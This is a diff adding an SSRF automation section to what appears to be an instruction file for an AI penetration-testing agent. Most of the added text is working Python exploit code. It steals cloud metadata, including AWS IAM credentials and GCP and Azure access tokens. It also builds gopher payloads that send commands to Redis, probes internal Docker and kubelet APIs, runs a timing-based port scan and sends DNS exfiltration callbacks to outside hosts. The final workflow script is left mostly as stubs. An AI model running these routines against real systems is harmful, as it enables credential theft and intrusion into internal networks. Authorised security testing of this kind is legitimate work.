@@ -120,6 +120,455 @@
 - RCE via protocol abuse (FCGI, Redis), Docker daemon access, or scriptable admin interfaces
 </impact>
 
+<automation_patterns>
+<title>AUTOMATED SSRF DETECTION AND EXPLOITATION</title>
+
+<critical>SSRF testing requires automation for OAST callbacks, metadata enumeration, and protocol fuzzing. Manual testing misses blind SSRF and timing-based detection.</critical>
+
+<oast_integration>
+**Setting Up Out-of-Band Detection:**
+
+```python
+# Use python tool to setup OAST listener
+import subprocess
+import time
+import requests
+
+def setup_interactsh():
+    """Setup interactsh for OAST detection."""
+    # Start interactsh client
+    proc = subprocess.Popen(
+        ['interactsh-client', '-json'],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True
+    )
+    
+    # Wait for domain generation
+    time.sleep(2)
+    output = proc.stdout.readline()
+    
+    # Extract domain (format: {"domain":"abc123.interact.sh"})
+    import json
+    data = json.loads(output)
+    oast_domain = data['domain']
+    
+    print(f"[+] OAST Domain: {oast_domain}")
+    return oast_domain, proc
+
+def check_interactions(proc, timeout=30):
+    """Check for DNS/HTTP interactions."""
+    interactions = []
+    start_time = time.time()
+    
+    while time.time() - start_time < timeout:
+        line = proc.stdout.readline()
+        if line:
+            try:
+                data = json.loads(line)
+                if 'protocol' in data:
+                    interactions.append(data)
+                    print(f"[!] Interaction: {data['protocol']} from {data.get('remote-address')}")
+            except json.JSONDecodeError:
+                pass
+    
+    return interactions
+
+# Usage
+oast_domain, proc = setup_interactsh()
+
+# Test SSRF with OAST
+payloads = [
+    f"http://{oast_domain}",
+    f"https://{oast_domain}",
+    f"http://{oast_domain}/ssrf-test"
+]
+
+for payload in payloads:
+    requests.post(target_url, json={"url": payload})
+    print(f"[*] Sent payload: {payload}")
+
+# Check for callbacks
+interactions = check_interactions(proc, timeout=10)
+if interactions:
+    print(f"[+] SSRF CONFIRMED: {len(interactions)} interactions detected")
+else:
+    print("[-] No OAST interactions detected")
+
+proc.terminate()
+```
+
+**Alternative: Using webhook.site:**
+```python
+# Simpler but less reliable
+import requests
+
+# Get webhook URL
+webhook_resp = requests.post('https://webhook.site/token')
+webhook_id = webhook_resp.json()['uuid']
+webhook_url = f"https://webhook.site/{webhook_id}"
+
+print(f"[+] Webhook URL: {webhook_url}")
+
+# Test SSRF
+requests.post(target_url, json={"url": webhook_url})
+
+# Check for requests
+time.sleep(5)
+requests_data = requests.get(f"https://webhook.site/token/{webhook_id}/requests").json()
+if requests_data['data']:
+    print(f"[+] SSRF CONFIRMED: {len(requests_data['data'])} requests received")
+```
+</oast_integration>
+
+<metadata_scanning>
+**Automated Cloud Metadata Enumeration:**
+
+```python
+# Use python tool for metadata scanning
+import requests
+from urllib.parse import urljoin
+
+def test_aws_metadata(target_url, param_name="url"):
+    """Test AWS IMDSv1 and IMDSv2."""
+    results = []
+    
+    # IMDSv1 endpoints
+    imdsv1_endpoints = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.169.254/latest/user-data",
+        "http://169.254.169.254/latest/dynamic/instance-identity/document"
+    ]
+    
+    for endpoint in imdsv1_endpoints:
+        try:
+            resp = requests.post(
+                target_url,
+                json={param_name: endpoint},
+                timeout=5
+            )
+            
+            # Check for AWS-specific indicators
+            if any(indicator in resp.text.lower() for indicator in 
+                   ['ami-id', 'instance-id', 'iam', 'security-credentials', 'region']):
+                print(f"[!] AWS METADATA LEAK: {endpoint}")
+                print(f"    Response preview: {resp.text[:200]}")
+                results.append({
+                    "endpoint": endpoint,
+                    "response": resp.text[:500],
+                    "status": resp.status_code
+                })
+        except requests.RequestException as e:
+            print(f"[-] Error testing {endpoint}: {e}")
+    
+    return results
+
+def test_gcp_metadata(target_url, param_name="url"):
+    """Test GCP metadata (requires Metadata-Flavor header)."""
+    # Note: Most SSRF sinks won't allow custom headers
+    # Test if intermediary adds headers or if sink supports it
+    
+    endpoints = [
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "http://metadata/computeMetadata/v1/project/project-id"
+    ]
+    
+    for endpoint in endpoints:
+        try:
+            resp = requests.post(target_url, json={param_name: endpoint}, timeout=5)
+            if 'access_token' in resp.text or 'project' in resp.text:
+                print(f"[!] GCP METADATA LEAK: {endpoint}")
+                return True
+        except:
+            pass
+    return False
+
+def test_azure_metadata(target_url, param_name="url"):
+    """Test Azure metadata (requires Metadata: true header)."""
+    endpoints = [
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+    ]
+    
+    for endpoint in endpoints:
+        try:
+            resp = requests.post(target_url, json={param_name: endpoint}, timeout=5)
+            if 'compute' in resp.text or 'access_token' in resp.text:
+                print(f"[!] AZURE METADATA LEAK: {endpoint}")
+                return True
+        except:
+            pass
+    return False
+
+# Execute all metadata tests
+print("[*] Testing AWS metadata...")
+aws_results = test_aws_metadata("https://target.com/fetch", "url")
+
+print("[*] Testing GCP metadata...")
+gcp_results = test_gcp_metadata("https://target.com/fetch", "url")
+
+print("[*] Testing Azure metadata...")
+azure_results = test_azure_metadata("https://target.com/fetch", "url")
+```
+</metadata_scanning>
+
+<protocol_testing>
+**Testing Non-HTTP Protocols:**
+
+```python
+# Use python tool for protocol fuzzing
+import urllib.parse
+
+def generate_gopher_redis_payload(commands):
+    """Generate gopher payload for Redis."""
+    # Redis protocol: *<num_args>\r\n$<len>\r\n<arg>\r\n...
+    redis_payload = ""
+    for cmd in commands:
+        parts = cmd.split()
+        redis_payload += f"*{len(parts)}\r\n"
+        for part in parts:
+            redis_payload += f"${len(part)}\r\n{part}\r\n"
+    
+    # URL encode for gopher
+    encoded = urllib.parse.quote(redis_payload)
+    return f"gopher://localhost:6379/_{encoded}"
+
+def test_internal_services(target_url, param_name="url"):
+    """Test common internal services."""
+    
+    # Redis via gopher
+    redis_info = generate_gopher_redis_payload(["INFO"])
+    redis_config = generate_gopher_redis_payload(["CONFIG", "GET", "*"])
+    
+    # Docker API
+    docker_containers = "http://localhost:2375/v1.24/containers/json"
+    docker_images = "http://localhost:2375/images/json"
+    
+    # Elasticsearch
+    es_indices = "http://localhost:9200/_cat/indices"
+    es_cluster = "http://localhost:9200/_cluster/health"
+    
+    # Kubernetes
+    k8s_pods = "http://localhost:10250/pods"
+    k8s_metrics = "http://localhost:10255/metrics"
+    
+    payloads = {
+        "Redis (gopher)": [redis_info, redis_config],
+        "Docker API": [docker_containers, docker_images],
+        "Elasticsearch": [es_indices, es_cluster],
+        "Kubernetes": [k8s_pods, k8s_metrics]
+    }
+    
+    for service, urls in payloads.items():
+        print(f"[*] Testing {service}...")
+        for url in urls:
+            try:
+                resp = requests.post(
+                    target_url,
+                    json={param_name: url},
+                    timeout=5
+                )
+                
+                # Check for service-specific indicators
+                indicators = {
+                    "Redis": ["redis_version", "role:master"],
+                    "Docker": ["Containers", "Image"],
+                    "Elasticsearch": ["health", "indices"],
+                    "Kubernetes": ["pods", "kubelet"]
+                }
+                
+                for svc, keywords in indicators.items():
+                    if any(kw in resp.text for kw in keywords):
+                        print(f"[!] {svc} ACCESSIBLE: {url}")
+                        print(f"    Response: {resp.text[:200]}")
+                        
+            except Exception as e:
+                pass
+
+# Execute
+test_internal_services("https://target.com/fetch", "url")
+```
+</protocol_testing>
+
+<blind_ssrf_detection>
+**Detecting Blind SSRF via Timing:**
+
+```python
+# Use python tool for timing-based blind SSRF
+import time
+import statistics
+
+def timing_based_port_scan(target_url, param_name="url", host="127.0.0.1"):
+    """Detect open/closed ports via response timing."""
+    
+    # Common internal ports
+    ports_to_test = [
+        22,    # SSH
+        80,    # HTTP
+        443,   # HTTPS
+        3306,  # MySQL
+        5432,  # PostgreSQL
+        6379,  # Redis
+        8080,  # Alt HTTP
+        9200,  # Elasticsearch
+        27017  # MongoDB
+    ]
+    
+    open_ports = []
+    closed_ports = []
+    
+    for port in ports_to_test:
+        timings = []
+        
+        # Test 3 times for accuracy
+        for _ in range(3):
+            url = f"http://{host}:{port}/"
+            start = time.time()
+            
+            try:
+                requests.post(
+                    target_url,
+                    json={param_name: url},
+                    timeout=10
+                )
+            except requests.Timeout:
+                pass
+            
+            elapsed = time.time() - start
+            timings.append(elapsed)
+        
+        avg_time = statistics.mean(timings)
+        
+        # Open ports typically respond faster (connection accepted)
+        # Closed ports timeout or return connection refused (slower)
+        if avg_time < 2.0:  # Threshold may need tuning
+            open_ports.append(port)
+            print(f"[+] Port {port} likely OPEN (avg: {avg_time:.2f}s)")
+        else:
+            closed_ports.append(port)
+            print(f"[-] Port {port} likely CLOSED (avg: {avg_time:.2f}s)")
+    
+    return open_ports, closed_ports
+
+# Execute timing-based scan
+open_ports, closed_ports = timing_based_port_scan(
+    "https://target.com/fetch",
+    "url",
+    "127.0.0.1"
+)
+
+print(f"\n[*] Summary: {len(open_ports)} open, {len(closed_ports)} closed")
+```
+
+**DNS-Based Blind SSRF:**
+```python
+# Combine with OAST for DNS exfiltration
+def dns_exfiltration_test(target_url, oast_domain, param_name="url"):
+    """Test blind SSRF via DNS subdomain exfiltration."""
+    
+    # Encode data in subdomain
+    test_data = "ssrf-test-12345"
+    payload_url = f"http://{test_data}.{oast_domain}"
+    
+    requests.post(target_url, json={param_name: payload_url})
+    
+    # Check OAST for DNS query
+    # If DNS query for test_data.oast_domain is received, SSRF confirmed
+    print(f"[*] Sent DNS exfiltration payload: {payload_url}")
+    print(f"[*] Check OAST logs for DNS query to: {test_data}.{oast_domain}")
+```
+</blind_ssrf_detection>
+
+<tool_selection>
+**When to use each tool:**
+
+1. **python tool** (PRIMARY for SSRF):
+   - OAST setup and checking (interactsh-client)
+   - Metadata endpoint scanning
+   - Protocol payload generation (gopher, dict)
+   - Timing-based port scanning
+   - Automated enumeration loops
+
+2. **terminal tool**:
+   - Running interactsh-client directly
+   - Using curl for manual verification
+   - Network diagnostics (nc, nmap if needed)
+
+3. **browser_action tool**:
+   - Testing SSRF in complex UI workflows
+   - Capturing network requests via DevTools
+   - Testing client-side SSRF (fetch from user input)
+
+4. **web_search tool**:
+   - Finding latest cloud metadata endpoints
+   - Researching protocol-specific payloads
+   - Discovering new SSRF techniques
+</tool_selection>
+
+<complete_workflow>
+**End-to-End SSRF Testing Workflow:**
+
+```python
+#!/usr/bin/env python3
+"""
+Complete SSRF Testing Script
+Save to /workspace/ssrf_test.py and run with python tool
+"""
+import requests
+import subprocess
+import time
+import json
+
+def main():
+    target_url = "https://target.com/api/fetch"
+    param_name = "url"
+    
+    print("[*] Starting SSRF testing workflow...")
+    
+    # Step 1: OAST Setup
+    print("\n[1] Setting up OAST listener...")
+    oast_domain = setup_oast()
+    
+    # Step 2: Test OAST callback
+    print("\n[2] Testing OAST callback...")
+    test_oast_callback(target_url, param_name, oast_domain)
+    
+    # Step 3: Test cloud metadata
+    print("\n[3] Testing cloud metadata endpoints...")
+    test_cloud_metadata(target_url, param_name)
+    
+    # Step 4: Test internal services
+    print("\n[4] Testing internal services...")
+    test_internal_services(target_url, param_name)
+    
+    # Step 5: Protocol fuzzing
+    print("\n[5] Testing non-HTTP protocols...")
+    test_protocols(target_url, param_name)
+    
+    # Step 6: Timing-based detection
+    print("\n[6] Performing timing-based port scan...")
+    timing_scan(target_url, param_name)
+    
+    print("\n[*] SSRF testing complete!")
+
+def setup_oast():
+    # Implementation from above
+    pass
+
+def test_oast_callback(target_url, param, oast_domain):
+    # Implementation from above
+    pass
+
+# ... other functions ...
+
+if __name__ == "__main__":
+    main()
+```
+</complete_workflow>
+</automation_patterns>
+
 <pro_tips>
 1. Prefer OAST callbacks first; then iterate on internal addressing and protocols.
 2. Test IPv6 and mixed-notation addresses; filters often ignore them.
